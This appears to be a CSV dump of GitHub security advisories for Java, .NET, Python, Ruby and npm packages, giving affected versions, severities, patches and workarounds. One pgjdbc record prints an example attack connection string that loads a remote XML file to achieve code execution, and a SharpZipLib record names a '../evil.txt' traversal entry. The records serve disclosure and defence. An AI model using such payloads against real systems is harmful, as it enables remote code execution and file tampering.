2177,35085,org.bouncycastle:bcprov-jdk15,GHSA-w285-wf9q-5w69,CVE-2016-1000352,https://github.com/advisories/GHSA-w285-wf9q-5w69,high,2018-10-17 16:27:38 UTC,In Bouncy Castle JCE Provider the ECIES implementation allowed the use of ECB mode,In the Bouncy Castle JCE Provider version 1.55 and earlier the ECIES implementation allowed the use of ECB mode. This mode is regarded as unsafe and support for it has been removed from the provider.,maven
2178,35085,org.bouncycastle:bcprov-jdk15,GHSA-fjqm-246c-mwqg,CVE-2016-1000346,https://github.com/advisories/GHSA-fjqm-246c-mwqg,low,2018-10-17 16:27:28 UTC,In Bouncy Castle JCE Provider the other party DH public key is not fully validated,In the Bouncy Castle JCE Provider version 1.55 and earlier the other party DH public key is not fully validated. This can cause issues as invalid keys can be used to reveal details about the other party's private key where static Diffie-Hellman is in use. As of release 1.56 the key parameters are checked on agreement calculation.,maven
2179,35085,org.bouncycastle:bcprov-jdk15,GHSA-2j2x-hx4g-2gf4,CVE-2016-1000344,https://github.com/advisories/GHSA-2j2x-hx4g-2gf4,high,2018-10-18 17:43:55 UTC,In Bouncy Castle JCE Provider the DHIES implementation allowed the use of ECB mode,In the Bouncy Castle JCE Provider version 1.55 and earlier the DHIES implementation allowed the use of ECB mode. This mode is regarded as unsafe and support for it has been removed from the provider.,maven
2180,35085,org.bouncycastle:bcprov-jdk15,GHSA-rrvx-pwf8-p59p,CVE-2016-1000343,https://github.com/advisories/GHSA-rrvx-pwf8-p59p,high,2018-10-17 16:24:22 UTC,In Bouncy Castle JCE Provider the DSA key pair generator generates a weak private key if used with default values,"In the Bouncy Castle JCE Provider version 1.55 and earlier the DSA key pair generator generates a weak private key if used with default values. If the JCA key pair generator is not explicitly initialised with DSA parameters, 1.55 and earlier generates a private value assuming a 1024 bit key size. In earlier releases this can be dealt with by explicitly passing parameters to the key pair generator.",maven
2181,35085,org.bouncycastle:bcprov-jdk15,GHSA-qcj7-g2j5-g7r3,CVE-2016-1000342,https://github.com/advisories/GHSA-qcj7-g2j5-g7r3,high,2018-10-17 16:24:12 UTC,In Bouncy Castle JCE Provider ECDSA does not fully validate ASN.1 encoding of signature on verification,"In the Bouncy Castle JCE Provider version 1.55 and earlier ECDSA does not fully validate ASN.1 encoding of signature on verification. It is possible to inject extra elements in the sequence making up the signature and still have it validate, which in some cases may allow the introduction of 'invisible' data into a signed structure.",maven
2182,35085,org.bouncycastle:bcprov-jdk15,GHSA-r9ch-m4fh-fc7q,CVE-2016-1000341,https://github.com/advisories/GHSA-r9ch-m4fh-fc7q,moderate,2018-10-17 16:24:00 UTC,Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15,"In the Bouncy Castle JCE Provider version 1.55 and earlier DSA signature generation is vulnerable to timing attack. Where timings can be closely observed for the generation of signatures, the lack of blinding in 1.55, or earlier, may allow an attacker to gain information about the signature's k value and ultimately the private value as well.",maven
2183,35085,org.bouncycastle:bcprov-jdk15,GHSA-r97x-3g8f-gx3m,CVE-2016-1000340,https://github.com/advisories/GHSA-r97x-3g8f-gx3m,high,2018-10-17 16:23:50 UTC,The Bouncy Castle JCE Provider carry a propagation bug,"In the Bouncy Castle JCE Provider versions 1.51 to 1.55, a carry propagation bug was introduced in the implementation of squaring for several raw math classes have been fixed (org.bouncycastle.math.raw.Nat???). These classes are used by our custom elliptic curve implementations (org.bouncycastle.math.ec.custom.**), so there was the possibility of rare (in general usage) spurious calculations for elliptic curve scalar multiplications. Such errors would have been detected with high probability by the output validation for our scalar multipliers.",maven
2184,35085,org.bouncycastle:bcprov-jdk15,GHSA-c8xf-m4ff-jcxj,CVE-2016-1000339,https://github.com/advisories/GHSA-c8xf-m4ff-jcxj,moderate,2018-10-17 16:23:38 UTC,Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15,In the Bouncy Castle JCE Provider version 1.55 and earlier the primary engine class used for AES was AESFastEngine. Due to the highly table driven approach used in the algorithm it turns out that if the data channel on the CPU can be monitored the lookup table accesses are sufficient to leak information on the AES key being used. There was also a leak in AESEngine although it was substantially less. AESEngine has been modified to remove any signs of leakage (testing carried out on Intel X86-64) and is now the primary AES class for the BC JCE provider from 1.56. Use of AESFastEngine is now only recommended where otherwise deemed appropriate.,maven
2185,35085,org.bouncycastle:bcprov-jdk15,GHSA-4vhj-98r6-424h,CVE-2016-1000338,https://github.com/advisories/GHSA-4vhj-98r6-424h,high,2018-10-17 16:23:26 UTC,In Bouncy Castle JCE Provider it is possible to inject extra elements in the sequence making up the signature and still have it validate,"In Bouncy Castle JCE Provider version 1.55 and earlier the DSA does not fully validate ASN.1 encoding of signature on verification. It is possible to inject extra elements in the sequence making up the signature and still have it validate, which in some cases may allow the introduction of 'invisible' data into a signed structure.",maven
2186,35085,org.bouncycastle:bcprov-jdk15,GHSA-4446-656p-f54g,CVE-2018-1000613,https://github.com/advisories/GHSA-4446-656p-f54g,critical,2018-10-17 16:23:12 UTC,Deserialization of Untrusted Data in Bouncy castle,Legion of the Bouncy Castle Legion of the Bouncy Castle Java Cryptography APIs version prior to version 1.60 contains a CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection') vulnerability in XMSS/XMSS^MT private key deserialization that can result in Deserializing an XMSS/XMSS^MT private key can result in the execution of unexpected code. This attack appear to be exploitable via A handcrafted private key can include references to unexpected classes which will be picked up from the class path for the executing application. This vulnerability appears to have been fixed in 1.60 and later.,maven
2187,39144,org.apache.camel:camel-servlet,GHSA-26v6-w6fw-rh94,CVE-2015-5348,https://github.com/advisories/GHSA-26v6-w6fw-rh94,high,2018-10-16 23:12:20 UTC,Apache Camel can allow remote attackers to execute arbitrary commands,"Apache Camel 2.6.x through 2.14.x, 2.15.x before 2.15.5, and 2.16.x before 2.16.1, when using (1) camel-jetty or (2) camel-servlet as a consumer in Camel routes, allow remote attackers to execute arbitrary commands via a crafted serialized Java object in an HTTP request.",maven
2188,12903,Microsoft.AspNetCore.Mvc.Core,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2189,13264,System.IO.Pipelines,GHSA-j378-6mmw-hqfr,CVE-2018-8409,https://github.com/advisories/GHSA-j378-6mmw-hqfr,high,2018-10-16 19:56:38 UTC,Denial of service vulnerability exists when System.IO.Pipelines improperly handles requests,"A denial of service vulnerability exists when System.IO.Pipelines improperly handles requests, aka ""System.IO.Pipelines Denial of Service."" This affects .NET Core 2.1, System.IO.Pipelines, ASP.NET Core 2.1.",nuget
2190,35085,org.bouncycastle:bcprov-jdk15,GHSA-xqj7-j8j5-f2xr,CVE-2018-1000180,https://github.com/advisories/GHSA-xqj7-j8j5-f2xr,high,2018-10-16 17:44:39 UTC,Bouncy Castle has a flaw in the Low-level interface to RSA key pair generator,"Bouncy Castle BC 1.54 - 1.59, BC-FJA 1.0.0, BC-FJA 1.0.1 and earlier have a flaw in the Low-level interface to RSA key pair generator, specifically RSA Key Pairs generated in low-level API with added certainty may have less M-R tests than expected. This appears to be fixed in versions BC 1.60 beta 4 and later, BC-FJA 1.0.2 and later.",maven
2191,13613,YamlDotNet.Signed,GHSA-rpch-cqj9-h65r,CVE-2018-1000210,https://github.com/advisories/GHSA-rpch-cqj9-h65r,high,2018-10-16 17:01:10 UTC,High severity vulnerability that affects YamlDotNet and YamlDotNet.Signed,"YamlDotNet version 4.3.2 and earlier contains a Insecure Direct Object Reference vulnerability in The default behavior of Deserializer.Deserialize() will deserialize user-controlled types in the line ""currentType = Type.GetType(nodeEvent.Tag.Substring(1), throwOnError: false);"" and blindly instantiates them. that can result in Code execution in the context of the running process. This attack appear to be exploitable via Victim must parse a specially-crafted YAML file. This vulnerability appears to have been fixed in 5.0.0.",nuget
2192,19199,archive-tar-minitar,GHSA-cwp3-834g-x79g,,https://github.com/advisories/GHSA-cwp3-834g-x79g,moderate,2018-08-21 17:07:36 UTC,Moderate severity vulnerability that affects archive-tar-minitar and minitar,"Withdrawn, accidental duplicate publish.

Directory traversal vulnerability in the minitar before 0.6 and archive-tar-minitar 0.5.2 gems for Ruby allows remote attackers to write to arbitrary files via a .. (dot dot) in a TAR archive entry.",rubygems
2193,30233,Zope2,GHSA-p6h9-hpcg-c6gm,CVE-2011-2528,https://github.com/advisories/GHSA-p6h9-hpcg-c6gm,high,2018-07-23 19:52:02 UTC,High severity vulnerability that affects Plone and Zope2,"Unspecified vulnerability in (1) Zope 2.12.x before 2.12.19 and 2.13.x before 2.13.8, as used in Plone 4.x and other products, and (2) PloneHotfix20110720 for Plone 3.x allows attackers to gain privileges via unspecified vectors, related to a ""highly serious vulnerability."" NOTE: this vulnerability exists because of an incorrect fix for CVE-2011-0720.",pip
2194,19282,puppet,GHSA-92v7-pq4h-58j5,CVE-2014-3248,https://github.com/advisories/GHSA-92v7-pq4h-58j5,moderate,2017-10-24 18:33:36 UTC,"Moderate severity vulnerability that affects facter, hiera, mcollective-client, and puppet","Untrusted search path vulnerability in Puppet Enterprise 2.8 before 2.8.7, Puppet before 2.7.26 and 3.x before 3.6.2, Facter 1.6.x and 2.x before 2.0.2, Hiera before 1.3.4, and Mcollective before 2.5.2, when running with Ruby 1.9.1 or earlier, allows local users to gain privileges via a Trojan horse file in the current working directory, as demonstrated using (1) rubygems/defaults/operating_system.rb, (2) Win32API.rb, (3) Win32API.so, (4) safe_yaml.rb, (5) safe_yaml/deep.rb, or (6) safe_yaml/deep.so; or (7) operatingsystem.rb, (8) operatingsystem.so, (9) osfamily.rb, or (10) osfamily.so in puppet/confine.",rubygems
2195,19584,hiera,GHSA-92v7-pq4h-58j5,CVE-2014-3248,https://github.com/advisories/GHSA-92v7-pq4h-58j5,moderate,2017-10-24 18:33:36 UTC,"Moderate severity vulnerability that affects facter, hiera, mcollective-client, and puppet","Untrusted search path vulnerability in Puppet Enterprise 2.8 before 2.8.7, Puppet before 2.7.26 and 3.x before 3.6.2, Facter 1.6.x and 2.x before 2.0.2, Hiera before 1.3.4, and Mcollective before 2.5.2, when running with Ruby 1.9.1 or earlier, allows local users to gain privileges via a Trojan horse file in the current working directory, as demonstrated using (1) rubygems/defaults/operating_system.rb, (2) Win32API.rb, (3) Win32API.so, (4) safe_yaml.rb, (5) safe_yaml/deep.rb, or (6) safe_yaml/deep.so; or (7) operatingsystem.rb, (8) operatingsystem.so, (9) osfamily.rb, or (10) osfamily.so in puppet/confine.",rubygems
2196,19293,minitar,GHSA-h5g2-38x9-4gv3,CVE-2016-10173,https://github.com/advisories/GHSA-h5g2-38x9-4gv3,high,2017-10-24 18:33:35 UTC,High severity vulnerability that affects archive-tar-minitar and minitar,Directory traversal vulnerability in the minitar before 0.6 and archive-tar-minitar 0.5.2 gems for Ruby allows remote attackers to write to arbitrary files via a .. (dot dot) in a TAR archive entry.,rubygems
2197,20306,Products.CMFPlone,GHSA-8w54-22w9-3g8f,,https://github.com/advisories/GHSA-8w54-22w9-3g8f,moderate,2022-01-28 23:10:40 UTC,Cross-site Scripting and Open Redirect in Products.CMFPlone,"### Impact
Plone is vulnerable to reflected cross site scripting and open redirect when an attacker can get a compromised version of the image_view_fullscreen page in a cache, for example in Varnish.
The technique is known as cache poisoning.
Any later visitor can get redirected when clicking on a link on this page.
Usually only anonymous users are affected, but this depends on your cache settings.

### Patches
No patch is available for the Products.CMFPlone 4 series.
Versions 5.0 and higher are not affected, but two other packages used by these versions are affected.

`plone.app.contenttypes` has the same problem in all versions, see [advisory](https://github.com/plone/plone.app.contenttypes/security/advisories/GHSA-f7qw-5fgj-247x).
In Plone 5.0-5.2, the default Products.ATContentTypes version has the same problem. See [advisory](https://github.com/plone/Products.ATContentTypes/security/advisories/GHSA-g4c2-ghfg-g5rh).
Plone 5.2.7 and 6.0.0a3 will be released today and will include these fixes.

For all unpatched versions of the three packages, you can use the following workaround.

### Workaround
Make sure the image_view_fullscreen page is not stored in the cache.
In Plone:

* Login as Manager and go to Site Setup.
* Go to the 'Caching' control panel. If this does not exist, or 'Enable caching' is not checked, you should normally not be vulnerable.
* Click on the tab 'Caching operations'.
* Under 'Legacy template mappings' locate the ruleset 'Content item view'.
* From the last column ('Templates')  remove 'image_view_fullscreen'.
* Click on Save.

### Reporter
This vulnerability was responsibly disclosed to the Plone Security Team by Gustav Hansen, F-Secure Consulting. Thank you!

### For more information
If you have any questions or comments about this advisory, email us at [security@plone.org](mailto:security@plone.org)
This is also the correct address to use when you want to report a possible vulnerability.
See [our security report policy](https://plone.org/security/report).",pip
2198,16863,next,GHSA-wr66-vrwm-5g5x,CVE-2022-21721,https://github.com/advisories/GHSA-wr66-vrwm-5g5x,moderate,2022-01-28 23:09:22 UTC,Denial of Service Vulnerability in next.js,"### Impact

Vulnerable code could allow a bad actor to trigger a denial of service attack for anyone running a Next.js app at version >= 12.0.0, and using i18n functionality.

- **Affected:** All of the following must be true to be affected by this CVE
  - Next.js versions above v12.0.0
  - Using next start or a custom server
  - Using the built-in i18n support
- **Not affected:**
  - Deployments on Vercel (vercel.com) are not affected along with similar environments where invalid requests are filtered before reaching Next.js.

### Patches

A patch has been released, `next@12.0.9`, that mitigates this issue. We recommend all affected users upgrade as soon as possible.

### Workarounds

We recommend upgrading whether you can reproduce or not although you can ensure `/${locale}/_next/` is blocked from reaching the Next.js instance until you upgrade.

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [next](https://github.com/vercel/next.js)
* Email us at [security@vercel.com](mailto:security@vercel.com)
",npm
2199,20810,apache-airflow,GHSA-4jh2-3c85-q67h,CVE-2021-45230,https://github.com/advisories/GHSA-4jh2-3c85-q67h,moderate,2022-01-28 21:55:34 UTC,Improper Privilege Management in apache-airflow,"In Apache Airflow prior to 2.2.0. This CVE applies to a specific case where a User who has ""can_create"" permissions on DAG Runs can create Dag Runs for dags that they don't have ""edit"" permissions for.",pip
2200,36192,org.apache.karaf:apache-karaf,GHSA-544x-2jx9-4pfg,CVE-2022-22932,https://github.com/advisories/GHSA-544x-2jx9-4pfg,moderate,2022-01-28 22:25:03 UTC,Path traversal in Apache Karaf,"Apache Karaf obr:* commands and run goal on the karaf-maven-plugin have partial path traversal which allows to break out of expected folder. The risk is low as obr:* commands are not very used and the entry is set by user. This has been fixed in revision: https://gitbox.apache.org/repos/asf?p=karaf.git;h=36a2bc4 https://gitbox.apache.org/repos/asf?p=karaf.git;h=52b70cf Mitigation: Apache Karaf users should upgrade to 4.2.15 or 4.3.6 or later as soon as possible, or use correct path. JIRA Tickets: https://issues.apache.org/jira/browse/KARAF-7326",maven
2201,36192,org.apache.karaf:apache-karaf,GHSA-jh5g-9m4v-9vv9,CVE-2021-41766,https://github.com/advisories/GHSA-jh5g-9m4v-9vv9,high,2022-01-28 22:24:48 UTC,Insecure Java Deserialization in Apache Karaf,"Apache Karaf allows monitoring of applications and the Java runtime by using the Java Management Extensions (JMX). JMX is a Java RMI based technology that relies on Java serialized objects for client server communication. Whereas the default JMX implementation is hardened against unauthenticated deserialization attacks, the implementation used by Apache Karaf is not protected against this kind of attack. The impact of Java deserialization vulnerabilities strongly depends on the classes that are available within the targets class path. Generally speaking, deserialization of untrusted data does always represent a high security risk and should be prevented. The risk is low as, by default, Karaf uses a limited set of classes in the JMX server class path. It depends of system scoped classes (e.g. jar in the lib folder).",maven
2202,20043,loguru,GHSA-cvp7-c586-cmf4,CVE-2022-0329,https://github.com/advisories/GHSA-cvp7-c586-cmf4,low,2022-01-28 22:01:45 UTC,Withdrawn: Code Injection in loguru,"# Withdrawn

This advisory has been withdrawn after the maintainers of loguru noted this issue is not a security vulnerability and the CVE has been revoked. We have [stopped](https://github.com/Delgan/loguru/issues/563#issuecomment-1025223732) Dependabot alerts regarding this issue.

## Original Description

In versions of loguru up to and including 0.5.3 a lack of sanitization on log serialization can lead to arbitrary code execution. The maintainer disputes the issue, but has altered behavior of the library in commit 4b0070a4f30cbf6d5e12e6274b242b62ea11c81b. See https://github.com/Delgan/loguru/issues/563 for further discussion of the issue. The function in question is intended for internal use only, but is not restricted. This has been patched in version 0.6.0.",pip
2203,29714,treq,GHSA-fhpf-pp6p-55qc,CVE-2022-23607,https://github.com/advisories/GHSA-fhpf-pp6p-55qc,moderate,2022-02-01 00:43:38 UTC,Unsafe handling of user-specified cookies in treq,"### Impact

Treq's request methods (`treq.get`, `treq.post`, `HTTPClient.request`, `HTTPClient.get`, etc.) accept cookies as a dictionary, for example:

```py
treq.get('https://example.com/', cookies={'session': '1234'})
```

Such cookies are not bound to a single domain, and are therefore sent to *every* domain (""supercookies""). This can potentially cause sensitive information to leak upon an HTTP redirect to a different domain., e.g. should `https://example.com` redirect to `http://cloudstorageprovider.com` the latter will receive the cookie `session`.

### Patches

Treq 2021.1.0 and later bind cookies given to request methods (`treq.request`, `treq.get`, `HTTPClient.request`, `HTTPClient.get`, etc.) to the origin of the *url* parameter.

### Workarounds

Instead of passing a dictionary as the *cookies* argument, pass a `http.cookiejar.CookieJar` instance with properly domain- and scheme-scoped cookies in it:

```py
from http.cookiejar import CookieJar
from requests.cookies import create_cookie

jar = CookieJar()
jar.add_cookie(
    create_cookie(
        name='session',
        value='1234',
        domain='example.com',
        secure=True,
    ),
)
client = HTTPClient(cookies=jar)
client.get('https://example.com/')
```

### References

* Originally reported at [huntr.dev](https://huntr.dev/bounties/3c9204fc-a3d1-4441-8599-924c5f57e7ae/?token=06d930e37046c914bcb037e85cc227dc7b510b475989fc69837566562ba899277d46b0fb4b1e21cdcb6ddc1b7d9b1ded632cf3a3551ecb89afca16a63b34641284b50479d5195bba2ac09b116f3dd4fad27f54404c2de922c05c8c8b744aec27bb4d4d198cb8b3abf479af0c2d5fbaa10412da7922594ac3eb39)
* A related issue in the handling of HTTP basic authentication was addressed in Twisted 22.1 ([GHSA-92x2-jw7w-xvvx](https://github.com/twisted/twisted/security/advisories/GHSA-92x2-jw7w-xvvx), CVE-2022-21712).",pip
2204,38506,com.github.junrar:junrar,GHSA-m6cj-93v6-cvr5,CVE-2022-23596,https://github.com/advisories/GHSA-m6cj-93v6-cvr5,high,2022-02-01 00:47:23 UTC,Junrar vulnerable to infinite loop via extracting carefully crafted RAR archive,"### Impact
A carefully crafted RAR archive can trigger an infinite loop while extracting said archive. The impact depends solely on how the application uses the library, and whether files can be provided by malignant users. 

### Patches
The problem is partially patched in 7.4.1

### Workarounds
None

### References

https://github.com/junrar/junrar/issues/73

https://github.com/junrar/junrar/issues/81
",maven
2205,28945,Flask-AppBuilder,GHSA-wfjw-w6pv-8p7f,CVE-2022-21659,https://github.com/advisories/GHSA-wfjw-w6pv-8p7f,moderate,2022-02-01 00:47:53 UTC,Observable Response Discrepancy in Flask-AppBuilder,"### Impact
User enumeration in database authentication in Flask-AppBuilder  < 3.4.4. Allows for a non authenticated user to enumerate existing accounts by timing the response time from the server when you are logging in.

### Patches
Upgrade to 3.4.4

### Workarounds

### References

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)
",pip
2206,34016,com.thoughtworks.xstream:xstream,GHSA-rmr5-cpv2-vgjf,CVE-2021-43859,https://github.com/advisories/GHSA-rmr5-cpv2-vgjf,high,2022-02-01 00:48:15 UTC,Denial of Service by injecting highly recursive collections or maps in XStream,"### Impact
The vulnerability may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed input stream.

### Patches
XStream 1.4.19 monitors and accumulates the time it takes to add elements to collections and throws an exception if a set threshold is exceeded.

### Workarounds
The attack uses the hash code implementation for collections and maps to force an exponential calculation time due to highly recursive structures with in the collection or map. Following types of the Java runtime are affected in Java versions available in December 2021:

- java.util.HashMap
- java.util.HashSet
- java.util.Hashtable
- java.util.LinkedHashMap
- java.util.LinkedHashSet
- java.util.Stack (older Java revisions only)
- java.util.Vector (older Java revisions only)
- Other third party collection implementations that use their element's hash code may also be affected

If your object graph does not use referenced elements at all, you may simply set the NO_REFERENCE mode:
```Java
XStream xstream = new XStream();
xstream.setMode(XStream.NO_REFERENCES);
```

If your object graph contains neither a Hashtable, HashMap nor a HashSet (or one of the linked variants of it) then you can use the security framework to deny the usage of these types:
```Java
XStream xstream = new XStream();
xstream.denyTypes(new Class[]{
 java.util.HashMap.class, java.util.HashSet.class, java.util.Hashtable.class, java.util.LinkedHashMap.class, java.util.LinkedHashSet.class
});
```

Unfortunately these types are very common. If you only use HashMap or HashSet and your XML refers these only as default map or set, you may additionally change the default implementation of java.util.Map and java.util.Set at unmarshalling time::
```Java
xstream.addDefaultImplementation(java.util.TreeMap.class, java.util.Map.class);
xstream.addDefaultImplementation(java.util.TreeSet.class, java.util.Set.class);
```
However, this implies that your application does not care about the implementation of the map and all elements are comparable.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-43859](https://x-stream.github.io/CVE-2021-43859.html).

### Credits
The vulnerability was discovered and reported by r00t4dm at Cloud-Penetrating Arrow Lab.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
2207,34022,org.postgresql:postgresql,GHSA-v7wg-cpwc-24m4,CVE-2022-21724,https://github.com/advisories/GHSA-v7wg-cpwc-24m4,high,2022-02-02 00:04:20 UTC,pgjdbc Does Not Check Class Instantiation when providing Plugin Classes,"### Impact

pgjdbc instantiates plugin instances based on class names provided via `authenticationPluginClassName`, `sslhostnameverifier`, `socketFactory`, `sslfactory`, `sslpasswordcallback` connection properties.

However, the driver did not verify if the class implements the expected interface before instantiating the class.

Here's an example attack using an out-of-the-box class from Spring Framework:

```
DriverManager.getConnection(""jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml"");
```

The first impacted version is REL9.4.1208 (it introduced `socketFactory` connection property)",maven
2208,12991,SharpZipLib,GHSA-mm6g-mmq6-53ff,CVE-2021-32842,https://github.com/advisories/GHSA-mm6g-mmq6-53ff,moderate,2022-02-01 16:23:00 UTC,Path Traversal in SharpZipLib,"SharpZipLib (or #ziplib) is a Zip, GZip, Tar and BZip2 library. Starting version 1.0.0 and prior to version 1.3.3, a check was added if the destination file is under a destination directory. However, it is not enforced that `_baseDirectory` ends with slash. If the _baseDirectory is not slash terminated like `/home/user/dir` it is possible to create a file with a name thats begins as the destination directory one level up from the directory, i.e. `/home/user/dir.sh`. Because of the file name and destination directory constraints, the arbitrary file creation impact is limited and depends on the use case. Version 1.3.3 fixed this vulnerability.",nuget
2209,12991,SharpZipLib,GHSA-2x7h-96h5-rq84,CVE-2021-32841,https://github.com/advisories/GHSA-2x7h-96h5-rq84,moderate,2022-02-01 16:22:57 UTC,Path Traversal in SharpZipLib,"SharpZipLib (or #ziplib) is a Zip, GZip, Tar and BZip2 library. Starting version 1.3.0 and prior to version 1.3.3, a check was added if the destination file is under destination directory. However, it is not enforced that `destDir` ends with slash. If the `destDir` is not slash terminated like `/home/user/dir` it is possible to create a file with a name thats begins with the destination directory, i.e. `/home/user/dir.sh`. Because of the file name and destination directory constraints, the arbitrary file creation impact is limited and depends on the use case. Version 1.3.3 contains a patch for this vulnerability.",nuget
2210,12991,SharpZipLib,GHSA-m22m-h4rf-pwq3,CVE-2021-32840,https://github.com/advisories/GHSA-m22m-h4rf-pwq3,high,2022-02-01 16:22:50 UTC,Path Traversal in SharpZipLib,"SharpZipLib (or #ziplib) is a Zip, GZip, Tar and BZip2 library. Prior to version 1.3.3, a TAR file entry `../evil.txt` may be extracted in the parent directory of `destFolder`. This leads to arbitrary file write that may lead to code execution. The vulnerability was patched in version 1.3.3.",nuget
2211,34418,org.apache.cassandra:cassandra-all,GHSA-2vxm-vp4c-fjfw,CVE-2020-17516,https://github.com/advisories/GHSA-2vxm-vp4c-fjfw,high,2022-02-09 01:01:22 UTC,Authentication Bypass in Apache Cassandra,"Apache Cassandra versions 2.1.0 to 2.1.22, 2.2.0 to 2.2.19, 3.0.0 to 3.0.23, and 3.11.0 to 3.11.9, when using 'dc' or 'rack' internode_encryption setting, allows both encrypted and unencrypted internode connections. A misconfigured node or a malicious user can use the unencrypted connection despite not being in the same rack or dc, and bypass mutual TLS requirement.",maven
2212,20092,ansible,GHSA-h39q-95q5-9jfp,CVE-2020-1734,https://github.com/advisories/GHSA-h39q-95q5-9jfp,moderate,2022-02-09 00:11:19 UTC,OS Command Injection in ansible,"A flaw was found in the pipe lookup plugin of ansible. Arbitrary commands can be run, when the pipe lookup plugin uses subprocess.Popen() with shell=True, by overwriting ansible facts and the variable is not escaped by quote plugin. An attacker could take advantage and run arbitrary commands by overwriting the ansible facts.",pip
2213,34497,io.undertow:undertow-core,GHSA-rhcw-wjcm-9h6g,CVE-2020-27782,https://github.com/advisories/GHSA-rhcw-wjcm-9h6g,high,2022-02-09 00:54:12 UTC,Denial of service in Undertow,"A flaw was found in the Undertow AJP connector. Malicious requests and abrupt connection closes could be triggered by an attacker using query strings with non-RFC compliant characters resulting in a denial of service. The highest threat from this vulnerability is to system availability. This affects Undertow 2.1.5.SP1, 2.0.33.SP2, and 2.2.3.SP1.",maven
2214,35457,org.apache.xmlgraphics:xmlgraphics-commons,GHSA-fmj2-7wx8-qj4v,CVE-2020-11988,https://github.com/advisories/GHSA-fmj2-7wx8-qj4v,high,2022-02-09 00:45:56 UTC,Server-side request forgery (SSRF) in Apache XmlGraphics Commons,"Apache XmlGraphics Commons 2.4 is vulnerable to server-side request forgery, caused by improper input validation by the XMPParser. By using a specially-crafted argument, an attacker could exploit this vulnerability to cause the underlying server to make arbitrary GET requests.",maven
2215,20741,tensorflow,GHSA-627q-g293-49q7,CVE-2022-23580,https://github.com/advisories/GHSA-627q-g293-49q7,moderate,2022-02-07 22:01:24 UTC,Abort caused by allocating a vector that is too large in Tensorflow,"### Impact
During shape inference, TensorFlow can [allocate a large vector](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/shape_inference.cc#L788-L790) based on a value from a tensor controlled by the user:

```cc
  const auto num_dims = Value(shape_dim);
  std::vector<DimensionHandle> dims;
  dims.reserve(num_dims);
``` 
  
### Patches           
We have patched the issue in GitHub commit [1361fb7e29449629e1df94d44e0427ebec8c83c7](https://github.com/tensorflow/tensorflow/commit/1361fb7e29449629e1df94d44e0427ebec8c83c7).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. ",pip
2216,20741,tensorflow,GHSA-fq86-3f29-px2c,CVE-2022-23581,https://github.com/advisories/GHSA-fq86-3f29-px2c,moderate,2022-02-07 22:01:14 UTC,`CHECK`-failures during Grappler's `IsSimplifiableReshape` in Tensorflow,"### Impact
The Grappler optimizer in TensorFlow can be used to cause a denial of service by altering a `SavedModel` such that [`IsSimplifiableReshape`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L1687-L1742) would trigger `CHECK` failures.

### Patches
We have patched the issue in GitHub commits [ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1](https://github.com/tensorflow/tensorflow/commit/ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1), [1fb27733f943295d874417630edd3b38b34ce082](https://github.com/tensorflow/tensorflow/commit/1fb27733f943295d874417630edd3b38b34ce082), and [240655511cd3e701155f944a972db71b6c0b1bb6](https://github.com/tensorflow/tensorflow/commit/240655511cd3e701155f944a972db71b6c0b1bb6).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2217,34022,org.postgresql:postgresql,GHSA-88cc-g835-76rp,CVE-2020-13692,https://github.com/advisories/GHSA-88cc-g835-76rp,high,2022-02-10 00:30:07 UTC,Improper Restriction of XML External Entity Reference,PostgreSQL JDBC Driver (aka PgJDBC) before 42.2.13 allows XXE.,maven
2218,34577,org.apache.solr:solr-core,GHSA-j346-h5wc-rw2m,CVE-2018-11802,https://github.com/advisories/GHSA-j346-h5wc-rw2m,moderate,2022-02-09 23:19:26 UTC,Incorrect Authorization in Apache Solr,"In Apache Solr, the cluster can be partitioned into multiple collections and only a subset of nodes actually host any given collection. However, if a node receives a request for a collection it does not host, it proxies the request to a relevant node and serves the request. Solr bypasses all authorization settings for such requests. This affects all Solr versions prior to 7.7 that use the default authorization mechanism of Solr (RuleBasedAuthorizationPlugin).",maven
2219,34977,org.infinispan:infinispan-core,GHSA-8674-26jc-wh98,CVE-2020-25711,https://github.com/advisories/GHSA-8674-26jc-wh98,moderate,2022-02-09 22:56:32 UTC,Improper Access Control in infinispan-server-runtime,"A flaw was found in infinispan 10 REST API, where authorization permissions are not checked while performing some server management operations. When authz is enabled, any user with authentication can perform operations like shutting down the server without the ADMIN role.",maven
